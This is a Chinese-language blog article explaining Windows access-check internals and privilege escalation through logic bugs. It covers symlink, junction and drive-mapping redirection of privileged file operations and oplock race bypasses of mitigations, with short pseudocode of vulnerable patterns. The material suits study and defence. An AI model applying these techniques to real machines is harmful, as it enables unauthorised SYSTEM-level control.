<!DOCTYPE html>
<html>
<head><meta name="generator" content="Hexo 3.8.0">

    <!--[if lt IE 9]>
        <style>body {display: none; background: none !important} </style>
        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
    <![endif]-->

<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
<meta name="format-detection" content="telephone=no">
<meta name="author" content="lxf">


    
    


<meta name="description" content="逆向工程爱好者">
<meta property="og:type" content="website">
<meta property="og:title" content="Just a binary noob~~">
<meta property="og:url" content="http://yoursite.com/index.html">
<meta property="og:site_name" content="Just a binary noob~~">
<meta property="og:description" content="逆向工程爱好者">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Just a binary noob~~">
<meta name="twitter:description" content="逆向工程爱好者">

<link rel="apple-touch-icon" href="/apple-touch-icon.png">


    <link rel="alternate" href="/atom.xml" title="Just a binary noob~~" type="application/atom+xml">



    <link rel="shortcut icon" href="/favicon.png">



    <link href="//cdn.bootcss.com/animate.css/3.5.1/animate.min.css" rel="stylesheet">



    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">



    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-minimal.css" rel="stylesheet">


<link rel="stylesheet" href="/css/style.css">


    <style> .article { opacity: 0;} </style>


<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">


<title>Just a binary noob~~</title>

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>

<script>
    var yiliaConfig = {
        fancybox: true,
        animate: true,
        isHome: true,
        isPost: false,
        isArchive: false,
        isTag: false,
        isCategory: false,
        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
        search: false
    }
</script>


    <script> yiliaConfig.jquery_ui = [false]; </script>



    <script> yiliaConfig.rootUrl = "\/";</script>






</head></html>
<body>
  <div id="container">
    <div class="left-col">
    <div class="overlay"></div>
<div class="intrude-less">
    <header id="header" class="inner">
        <a href="/" class="profilepic">
            <img src="/img/1.jpg" class="animated zoomIn">
        </a>
        <hgroup>
          <h1 class="header-author"><a href="/">lxf</a></h1>
        </hgroup>

        

        


        
            <div id="switch-btn" class="switch-btn">
                <div class="icon">
                    <div class="icon-ctn">
                        <div class="icon-wrap icon-house" data-idx="0">
                            <div class="birdhouse"></div>
                            <div class="birdhouse_holes"></div>
                        </div>
                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
                            <div class="ribbon"></div>
                        </div>
                        
                        <div class="icon-wrap icon-link hide" data-idx="2">
                            <div class="loopback_l"></div>
                            <div class="loopback_r"></div>
                        </div>
                        
                        
                        <div class="icon-wrap icon-me hide" data-idx="3">
                            <div class="user"></div>
                            <div class="shoulder"></div>
                        </div>
                        
                    </div>
                    
                </div>
                <div class="tips-box hide">
                    <div class="tips-arrow"></div>
                    <ul class="tips-inner">
                        <li>菜单</li>
                        <li>标签</li>
                        
                        <li>友情链接</li>
                        
                        
                        <li>关于我</li>
                        
                    </ul>
                </div>
            </div>
        

        <div id="switch-area" class="switch-area">
            <div class="switch-wrap">
                <section class="switch-part switch-part1">
                    <nav class="header-menu">
                        <ul>
                        
                            <li><a href="/">主页</a></li>
                        
                            <li><a href="/archives/">所有文章</a></li>
                        
                            <li><a href="/tags/">标签云</a></li>
                        
                            <li><a href="/about/">关于我</a></li>
                        
                        </ul>
                    </nav>
                    <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" href="/842907395@qq.com" title="Email"></a>
                            
                                <a class="fa GitHub" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
                    </nav>
                </section>
                
                
                <section class="switch-part switch-part2">
                    <div class="widget tagcloud" id="js-tagcloud">
                        <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ctf/">ctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/算法/">算法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/编译原理/">编译原理</a></li></ul>
                    </div>
                </section>
                
                
                
                <section class="switch-part switch-part3">
                    <div id="js-friends">
                    
                      <a class="main-nav-link switch-friends-link" href="https://hexo.io">Hexo</a>
                    
                      <a class="main-nav-link switch-friends-link" href="https://pages.github.com/">GitHub</a>
                    
                      <a class="main-nav-link switch-friends-link" href="http://moxfive.xyz/">MOxFIVE</a>
                    
                    </div>
                </section>
                

                
                
                <section class="switch-part switch-part4">
                
                    <div id="js-aboutme">Just a binary noob~~</div>
                </section>
                
            </div>
        </div>
    </header>                
</div>
    </div>
    <div class="mid-col">
      <nav id="mobile-nav">
      <div class="overlay">
          <div class="slider-trigger"></div>
          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">lxf</a></h1>
      </div>
    <div class="intrude-less">
        <header id="header" class="inner">
            <a href="/" class="profilepic">
                <img src="/img/1.jpg" class="animated zoomIn">
            </a>
            <hgroup>
              <h1 class="header-author"><a href="/" title="回到主页">lxf</a></h1>
            </hgroup>
            
            <nav class="header-menu">
                <ul>
                
                    <li><a href="/">主页</a></li>
                
                    <li><a href="/archives/">所有文章</a></li>
                
                    <li><a href="/tags/">标签云</a></li>
                
                    <li><a href="/about/">关于我</a></li>
                
                <div class="clearfix"></div>
                </ul>
            </nav>
            <nav class="header-nav">
                        <ul class="social">
                            
                                <a class="fa Email" target="_blank" href="/842907395@qq.com" title="Email"></a>
                            
                                <a class="fa GitHub" target="_blank" href="#" title="GitHub"></a>
                            
                                <a class="fa RSS" target="_blank" href="/atom.xml" title="RSS"></a>
                            
                        </ul>
            </nav>
        </header>                
    </div>
    <link class="menu-list" tags="标签" friends="友情链接" about="关于我">
</nav>
      <div class="body-wrap">
  
    <article id="post-Windows-本地提权" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/11/24/Windows-本地提权/" class="article-date">
      <time datetime="2019-11-24T14:15:14.000Z" itemprop="datePublished">2019-11-24</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/11/24/Windows-本地提权/">Windows 本地提权</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="基于Windows本地提权的攻击方法"><a href="#基于Windows本地提权的攻击方法" class="headerlink" title="基于Windows本地提权的攻击方法"></a>基于Windows本地提权的攻击方法</h1><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>Windows本地提权指的是普通用户可以利用系统的漏洞，非法的将自身的权限提升到System，之前关于这方面的漏洞往往是基于内存破坏来实现的，通过内存破坏来实现任意代码执行，从而导致权限提升。而这篇文章，将会介绍通过利用Windows系统中的逻辑漏洞来实现本地提权</p>
<h2 id="Windows的访问权限检查机制"><a href="#Windows的访问权限检查机制" class="headerlink" title="Windows的访问权限检查机制"></a>Windows的访问权限检查机制</h2><p>在操作系统中，当我们提到安全的时候，意味着有一些资源需要被保护，在Windows操作系统中，这些被保护的资源大多以对象（Object）的形式存在，对象是对资源的一种抽象。每个对象都可以拥有自己的安全描述符（Security Descriptor），用来描述它能够被谁、以何种方式而访问。这些对象是客体，那么访问这些对象的主体是什么呢？这些主体就是操作系统中的各个进程，更准确地说是这些进程中的每个线程。每个进程都有一个基本令牌 (Primary Token)，可以被进程中的每个线程所共享，而有些线程比较特殊，它们正在模拟（Impersonating）某个客户端的身份，因此拥有一个模拟令牌（Impersonation Token），对于这些线程来说，有效令牌就是模拟令牌，而其他线程的有效令牌则是其所属进程的基本令牌。当主体尝试去访问客体时，操作系统会执行访问权限检查（Access Check），具体来说，是用主体的有效令牌与客体的安全描述符进行比对，从而确定该次访问是否合法。为了提高效率，访问权限检查（Access Check）提供了一种缓存机制，即只有当一个对象被一个进程创建或者打开时，才会进行访问权限检查，访问权限检查的结果会被缓存到进程的句柄表（Handle Table）中，该进程对该对象的后续操作只需要查询句柄表中内容即可确定访问的合法性，而不必每次都执行开销更大的访问权限检查（Access Check）。因为对象和进程都有各自的继承层次，所以对象的安全描述符和进程的令牌从逻辑上讲也是可以继承的，比如文件系统中的文件可以继承其所在目录的安全描述符，子进程可以继承父进程的令牌，这种继承机制使让对象和进程拥有了缺省的安全属性，因此，在一个系统中的安全描述符和令牌的实例数目非常有限，大多数情况下是从父辈们继承过来的缺省值。</p>
<h3 id="访问权限检查"><a href="#访问权限检查" class="headerlink" title="访问权限检查"></a>访问权限检查</h3><ul>
<li>DACL检查</li>
</ul>
<p>DACL（自主访问控制表，Discretionary Access Control List）检查是最基本的访问权限检查。<br><img src="https://lxf-img.oss-cn-hongkong.aliyuncs.com/img/20191126003846.png" alt><br>在安全描述符中存在着一个DACL表（见安全描述符图解），里面描述了拥有何种身份的主体申请的何种访问权限会被允许或者拒绝。DACL表中的每个表项拥有如下的结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">We&apos;ll define the structure of the predefined ACE types.  Pictorally</span><br><span class="line">the structure of the predefined ACE&apos;s is as follows:</span><br><span class="line"></span><br><span class="line">     3 3 2 2 2 2 2 2 2 2 2 2 1 1 1 1 1 1 1 1 1 1</span><br><span class="line">     1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0 9 8 7 6 5 4 3 2 1 0</span><br><span class="line">    +---------------+-------+-------+---------------+---------------+</span><br><span class="line">    |    AceFlags   | Resd  |Inherit|    AceSize    |     AceType   |</span><br><span class="line">    +---------------+-------+-------+---------------+---------------+</span><br><span class="line">    |                              Mask                             |</span><br><span class="line">    +---------------------------------------------------------------+</span><br><span class="line">    |                                                               |</span><br><span class="line">    +                                                               +</span><br><span class="line">    |                                                               |</span><br><span class="line">    +                              Sid                              +</span><br><span class="line">    |                                                               |</span><br><span class="line">    +                                                               +</span><br><span class="line">    |                                                               |</span><br><span class="line">    +---------------------------------------------------------------+</span><br><span class="line"></span><br><span class="line">Mask is the access mask associated with the ACE.  This is either the</span><br><span class="line">access allowed, access denied, audit, or alarm mask.</span><br><span class="line"></span><br><span class="line">Sid is the Sid associated with the ACE.</span><br></pre></td></tr></table></figure></p>
<p>其中，对于DACL来说，AceType可以有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#!cpp</span><br><span class="line">#define ACCESS_ALLOWED_ACE_TYPE                 (0x0)</span><br><span class="line">#define ACCESS_DENIED_ACE_TYPE                  (0x1)</span><br></pre></td></tr></table></figure></p>
<p>两种可能；Mask是一个代表相关权限集合的位图；主体的身份使用Sid（Security Identifier）来表示，这是一个变长的数据结构：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!cpp</span><br><span class="line">kd&gt; dt nt!_SID</span><br><span class="line">   +0x000 Revision         : UChar</span><br><span class="line">   +0x001 SubAuthorityCount : UChar</span><br><span class="line">   +0x002 IdentifierAuthority : _SID_IDENTIFIER_AUTHORITY</span><br><span class="line">   +0x008 SubAuthority     : [1] Uint4B</span><br></pre></td></tr></table></figure></p>
<p>Sid是Windows安全系统中一个基本类型，可以用来唯一标识多种不同种类的实体，比如标识用户身份与组身份，标识完整性级别、可信赖级别，AppContainer中的Capability等等。</p>
<p>DACL检查过程是这样的，如果对象的安全描述符为空，代表着这个对象不受任何保护，即可以被任何令牌代表的主体访问；如果对象拥有一个非空的安全描述符，但是安全描述符中的Dacl成员为空，代表该对象没有显式地赋予任何主体任何访问权限，即不允许被访问；如果Dacl成员非空，就按照表中的顺序逐一与当前主体的身份Sid进行比对，直到该主体所请求的权限被全部显式允许，或者某一请求的权限被显式地拒绝，检查结束；如果直到Dacl表检查结束，主体申请的权限仍未被全部显式允许，那么仍然代表拒绝。</p>
<p>根据以上规则可知，DACL中各个表项的顺序对访问权限检查的结果至关重要，比如说有一条有关某主体的显式拒绝的表项位于表的最后，如果位于其之前的表项已经显式允许了这一主体申请的权限，那么这条显式拒绝的表项将起不到任何作用。基于此种原因，如果通过Windows右键安全选项菜单添加的DACL表项，显式拒绝的表项永远被置于显式允许表项前面，以保证其有效性。直接通过API添加则不受此种限制。</p>
<h3 id="UAC与关联令牌"><a href="#UAC与关联令牌" class="headerlink" title="UAC与关联令牌"></a>UAC与关联令牌</h3><p>UAC是Vista版本引入的比较重要的安全机制，很多用户抱怨它带来的不便性，然而它就像Linux操作系统中的sudo一样，是保护系统安全的一道重要屏障。当用户登录Windows时，操作系统会为用户生成一对初始令牌，分别是代表着用户所拥有的全部权限的完整版本令牌（即管理员权限令牌），以及被限制管理员权限后的普通令牌，二者互为关联令牌；此后，代表用户的进程所使用的令牌都是由普通令牌继承而来，用来进行常规的、非敏感的操作；当用户需要进行一些需要管理员权限的操作时，比如安装软件、修改重要的系统设置时，都会通过弹出提权对话框的形式提示用户面临的风险，征求用户的同意，一旦用户同意，将会切换到当前普通令牌关联的管理员权限令牌，来进行敏感操作。通过这种与用户交互的方式，避免一些恶意程序在后台稍稍执行敏感操作。关联令牌是通过Logon Session来实现的，下图展示了其大致原理：</p>
<p><img src="https://lxf-img.oss-cn-hongkong.aliyuncs.com/img/20191126004253.png" alt></p>
<h3 id="安全描述符"><a href="#安全描述符" class="headerlink" title="安全描述符"></a>安全描述符</h3><p>安全描述符保存着作为访问权限检查客体的对象的主要信息。它包含着4个关键成员，根据这4个成员是嵌入在结构体的尾部，还是引用自外部缓存位置的差异，可以分为两种不同的结构形式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!cpp</span><br><span class="line">kd&gt; dt _SECURITY_DESCRIPTOR</span><br><span class="line">ntdll!_SECURITY_DESCRIPTOR</span><br><span class="line">   +0x000 Revision         : UChar</span><br><span class="line">   +0x001 Sbz1             : UChar</span><br><span class="line">   +0x002 Control          : Uint2B</span><br><span class="line">   +0x008 Owner            : Ptr64 Void</span><br><span class="line">   +0x010 Group            : Ptr64 Void</span><br><span class="line">   +0x018 Sacl             : Ptr64 _ACL</span><br><span class="line">   +0x020 Dacl             : Ptr64 _ACL</span><br><span class="line">kd&gt; dt _SECURITY_DESCRIPTOR_RELATIVE</span><br><span class="line">nt!_SECURITY_DESCRIPTOR_RELATIVE</span><br><span class="line">   +0x000 Revision         : UChar</span><br><span class="line">   +0x001 Sbz1             : UChar</span><br><span class="line">   +0x002 Control          : Uint2B</span><br><span class="line">   +0x004 Owner            : Uint4B</span><br><span class="line">   +0x008 Group            : Uint4B</span><br><span class="line">   +0x00c Sacl             : Uint4B</span><br><span class="line">   +0x010 Dacl             : Uint4B</span><br></pre></td></tr></table></figure></p>
<p>Owner和Group代表了该安全描述符的属主Sid，Sacl是系统访问控制表（System Access Control List）的简称，里面可以包含当前对象的审计（Audit）、完整性级别（Integrity Level）以及可信赖级别（Trust Level）等信息，与前面提到的Dacl共用同一结构体。</p>
<h3 id="完整性级别检查"><a href="#完整性级别检查" class="headerlink" title="完整性级别检查"></a>完整性级别检查</h3><p>完整性级别（IL）检查是沙盒的最简单实现方式，通过完整性级别在对象和进程层次之间的继承关系，就如同在操作系统中建立起了“世袭制度”。通过严格控制完整性级别的继承规则，以及设置严格的完整性级别检查制度，可以保证“出身低微”的主体无法访问到“出身高贵”的客体资源。</p>
<p>完整性拥有以下几个级别：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!bash</span><br><span class="line">SeUntrustedMandatorySid</span><br><span class="line">SeLowMandatorySid</span><br><span class="line">SeMediumMandatorySid</span><br><span class="line">SeHighMandatorySid</span><br><span class="line">SeSystemMandatorySid</span><br></pre></td></tr></table></figure></p>
<p>主体的缺省完整性级别是SeUntrustedMandatorySid，而客体的缺省完整性级别是SeMediumMandatorySid，这种差异也进一步地强化了这种“世袭制度”。</p>
<h3 id="保护进程"><a href="#保护进程" class="headerlink" title="保护进程"></a>保护进程</h3><p>保护进程（Protected Process）是Windows操作系统为了保护某些关键进程，防止其被普通进程调试、注入、甚至是读取内存信息而建立起来的一种安全机制。</p>
<p>保护进程与其他普通进程的区别在于，保护进程的Protection成员不为0。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#!cpp</span><br><span class="line">kd&gt; dt nt!_EPROCESS Protection</span><br><span class="line">   +0x6b2 Protection : _PS_PROTECTION</span><br><span class="line">kd&gt; dt nt!_PS_PROTECTION</span><br><span class="line">   +0x000 Level            : UChar</span><br><span class="line">   +0x000 Type             : Pos 0, 3 Bits</span><br><span class="line">   +0x000 Audit            : Pos 3, 1 Bit</span><br><span class="line">   +0x000 Signer           : Pos 4, 4 Bits</span><br></pre></td></tr></table></figure></p>
<p>保护进程的Type成员可以代表两种保护类型：Protected Process（PP），Protected Process Lite（PPL），两者的区别在于PP保护进程拥有更高的权限。保护进程的Signer成员代表该进程的签名发布者的类别。对于Signer为PsProtectedSignerWindows（5）和PsProtectedSignerTcb（6）的保护进程，其Type和Signer信息会被抽取出来，组装成一个Sid，代表着该进程的可信赖级别，保存到基本令牌中的TrustLevelSid成员中。当一个令牌中的TrustLevelSid被使用时，需要保证与当前进程的Protection信息保持同步，这主要是为了应对令牌在不同进程间传递时（比如子进程继承父进程的令牌）导致的TrustLevelSid成员过时的情形。当调试或者创建一个进程时，会调用内核函数PspCheckForInvalidAccessByProtection进行权限检查，该函数根据当前进程以及目标进程的Protection来判定当前操作是否需要遵守保护进程规定的权限限制，具体判定规则如下：如果操作来自于内核态代码，不需要遵守限制；如果目标进程的Protection成员为空，表示目标进程不是保护进程，不需要遵守限制；如果当前进程是PP类型保护进程，该类型保护进程拥有最高权限，不需要遵守限制；如果当前进程与目标进程都是PPL类型保护进程，需要根据RtlProtectedAccess表来判断当前进程的Signer是否优先于（dominate）目标进程的Signer，如果是，不需要遵守限制；其他情况，需要遵守限制。</p>
<h2 id="利用技巧"><a href="#利用技巧" class="headerlink" title="利用技巧"></a>利用技巧</h2><p>何为逻辑漏洞？例如如果一个system进程尝试去操作A文件，而A文件如果是一个指向B的符号链接，那么实际上System进程将会去操作B文件，这将导致错误的产生，一种通常的缓解措施为：通过函数<code>RpcImpersonateClient</code>或者<code>ImpersonateLoggedOnUser</code> 去模拟当前请求操作的用户，这样当前system进程的所有操作都将以user的权限来进行,与之对应的取消模拟的函数为<code>RevertToSelf</code></p>
<p>因此，此类逻辑漏洞的利用关键在于重定向当前的操作文件，NTFS文件系统支持如下类型的文件链接</p>
<ul>
<li>建立<code>HardLink</code>，将A硬链接到B，对于<code>HardLink</code>而言，不同的函数在处理<code>HardLink</code>时的行为不完全相同，（微软声称在最新版中<code>HardLink</code>已经被修复了，普通用户将不再有权限将A文件链接到其不可控的B文件）</li>
<li>建立目录链接<code>Junction</code>，将A目录链接到B目录</li>
<li>建立对象符号链接，这也是一种最常见的利用方式，它指的是将当前A文件所在目录<code>Junction</code>到Windows的对象管理器，然后在对象管理器下创建到B文件的符号链接</li>
<li>建立磁盘的符号链接，将当前用户的磁盘盘符映射到另外一个盘符，例如将C:\  映射到 D:\ ，直到注意的是，这一更改仅仅只针对当前用户生效，例如当system进程以其本身的身份访问C盘时，它访问的仍然是C盘，而如果它impersonate了当前的用户，那么它访问的将是D盘，针对这一特性可以用来绕过一些安全检查</li>
</ul>
<h2 id="漏洞模式"><a href="#漏洞模式" class="headerlink" title="漏洞模式"></a>漏洞模式</h2><ul>
<li>任意文件写入</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HANDLE file = CreateFile(Path,dwDesiredAccess,3,0,OPEN_ALWAYS,0x80);</span><br><span class="line">WriteFile(file,buffer,NumberOfBytesToWrite,lpNumberOfBytesWritten,lpOverlapped);</span><br></pre></td></tr></table></figure>
<p>如果以上代码以system权限运行，而path所有对应的文件可控，那么我们只需要将path所对应的文件符号链接到当前用户不可控的文件，buffer的内容就将会写入我们的目标，如果buffer可控，那么我们就能将代码写入system的DLL，从而实现任意代码执行</p>
<ul>
<li><p>任意文件删除</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DeleteFile(path);</span><br></pre></td></tr></table></figure>
<p>同样也是通过符号链接来达到任意文件删除的目的</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HANDLE file = CreateFile(Path,dwDesiredAccess,3,0,OPEN_ALWAYS,FILE_FLAG_DELETE_ON_CLOSE,0);</span><br></pre></td></tr></table></figure>
<p>我们关注一下这个参数<code>FILE_FLAG_DELETE_ON_CLOSE</code>,它指的是，当关闭当前打开的文件的句柄时，删除该文件，就算打开该文件时<code>dwDesiredAccess</code>没有指定删除，该flag也会自动添加该属性上去，因此如果path可控，我们只需要通过符号链接让他打开当前用户不可控的文件，就能实现任意文件删除.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HANDLE file = CreateFile(Path,dwDesiredAccess,3,0,OPEN_ALWAYS,0x80);</span><br><span class="line">SetFileInformationByHandle(file,FileDispositionInfo,lpFileInformation,dwBufferSize);</span><br></pre></td></tr></table></figure>
<p>通过设置<code>FileDispositionInfo</code>参数也能删除文件。详细信息<a href="https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfileinformationbyhandle" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-setfileinformationbyhandle</a></p>
<ul>
<li><p>CopyFile(A,B)及MoveFile(A,B)的利用<br>这两个函数都是将A文件写入B文件，不同的地方，在于<code>MoveFile</code>将会删除源文件，并且移动后的文件将保留其原来的ACL，利用方法也很明显：<br>—–&gt;  A 符号链接到 Source（包含我们的恶意代码的DLL）<br>—–&gt;  B 符号链接到 Target  (我们期望写入的位置)<br>从而实现任意代码执行</p>
</li>
<li><p>SetNamedSecurityInfo</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ConvertStringSecurityDescriptorToSecurityDescriptor(StringDescriptor,1,SecurityDescriptor,0)	</span><br><span class="line">SetNamedSecurityInfoW(path,ObjectType,SecurityInfo,NULL,NULL,NULL,NULL);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>如果<code>StringDescriptor</code>描述的安全属性的是普通用户可控，那么我们也能通过符号链接来设置任意文件的ACL,使得普通用户拥有该文件的控制权</p>
<ul>
<li>DuplicateHandle 及 DuplicateToken<br><code>DuplicateHandle</code>：常见的模式为system进程打开了了一个普通用户不可控的文件的句柄，然后把它复制给了当前的user，那么当前user就有了对该文件的控制权<br><code>DuplicateToken</code>：把system进程的Token复制给user，这种还没没见过。。</li>
</ul>
<h2 id="常见的漏洞缓解措施，及其绕过方式"><a href="#常见的漏洞缓解措施，及其绕过方式" class="headerlink" title="常见的漏洞缓解措施，及其绕过方式"></a>常见的漏洞缓解措施，及其绕过方式</h2><ul>
<li><p>检查HardLink</p>
<p>通过<code>GetFileInformationByHandle</code>，检查指向当前文件的Link的个数，这个可以通过符号链接来绕过</p>
</li>
<li><p>检查Junction和符号链接</p>
<p>GetFinalPathNameByHandleW`在进行敏感操作前，检查通过当前操作的句柄获取的路径和最开始输入的路径是否相同，来检查是否存在了重定向，值得一提的是这一检查对HardLink无效，如果是HardLink，前后获取的路径是一致的</p>
</li>
<li><p>Case1</p>
<p>考虑如下伪代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">ImpersonateClient(handle);</span><br><span class="line">if ( file=CreateFile(path)!=-1 )&#123;</span><br><span class="line">	RevertToSelf();</span><br><span class="line">	closeHandle(file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	return;</span><br><span class="line">&#125;</span><br><span class="line">DeleteFile(path);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>问题很明显，我们可以通过改变磁盘盘符的映射来绕过此类检查，当然还有别的绕过方式</p>
<ul>
<li><p>Case2</p>
<p>检查文件内容是否正确</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file = CreateFile(path);</span><br><span class="line">if ( !CheckFileContent(file) ) return 0;</span><br><span class="line">DeleteFile(path);</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>对于这种情况，我们需要利用机会锁来竞争，具体方式为在进程<code>createfile</code>时，锁住当前操作的文件，来bypass检查，然后修改文件路径到我们的目标。例如假设打开的是 <code>A\B\C.txt</code> ，我们建立符号链接 <code>B\C.txt -&gt; C\C.txt</code> <code>C.txt</code>的内容能满足这个检查，然后锁住<code>C\C.txt</code>，当进程打开这个文件时，该进程将会被阻塞，然后我们修改B\C.txt的符号链接到target，然后释放机会锁，<code>CheckFileContent</code>将会检查<code>C\C.txt</code>，而<code>DeleteFile</code>被执行时path将会重定向到Target .</p>
<p>Case1同样也能用机会锁来绕过</p>
<ul>
<li><p>Case3</p>
<p>QueryDirectory<code>查询文件夹下的文件，如果找到了，就会执行操作
代码形式为</code>FindNextFile`，伪代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">FindNextFile(&quot;A\B\&quot;,&quot;1.txt&quot;);</span><br><span class="line">if (success)&#123;</span><br><span class="line">	DeleteFile(&quot;A\B\1.txt&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ul>
<p>之前的直接建立符号链接的套路在此时是行不通的，如果把B\1.txt 符号链接到 Target，那么这个过程实际上是先把<code>B\</code>  Juntion 到 Windows的对象管理器，然后在windows的对象管理器下创建符号链接。 <code>QueryDirectory</code>将会去query windows的对象管理器，这个是肯定query不到文件的，因此我们需要绕过一下</p>
<p>我们可以先 把  <code>B\</code> junction 到 <code>C\</code>，然后再<code>C\</code>下放置，<code>1.txt</code>，然后创建机会锁，锁住<code>1.txt</code>,机会锁触发后 修改<code>B\1.txt</code> 符号链接到 target。这样就绕过了这一限制，这其实也不算漏洞缓解措施，只是需要特殊处理一下</p>
<p>参考链接：<br><a href="https://offsec.almond.consulting/intro-to-file-operation-abuse-on-Windows.html" target="_blank" rel="noopener">https://offsec.almond.consulting/intro-to-file-operation-abuse-on-Windows.html</a></p>
<p><a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces</a></p>
<p><a href="https://offsec.almond.consulting/osquery-windows-acl-misconfiguration-eop.html" target="_blank" rel="noopener">https://offsec.almond.consulting/osquery-windows-acl-misconfiguration-eop.html</a></p>
<p><a href="https://xz.aliyun.com/t/3125" target="_blank" rel="noopener">https://xz.aliyun.com/t/3125</a></p>
<p><a href="https://www.fortinet.com/blog/threat-research/another-local-privilege-escalation-lpe-vulnerability.html" target="_blank" rel="noopener">https://www.fortinet.com/blog/threat-research/another-local-privilege-escalation-lpe-vulnerability.html</a></p>
<p><a href="https://juejin.im/post/5aa118b46fb9a028c71e07d7" target="_blank" rel="noopener">https://juejin.im/post/5aa118b46fb9a028c71e07d7</a></p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
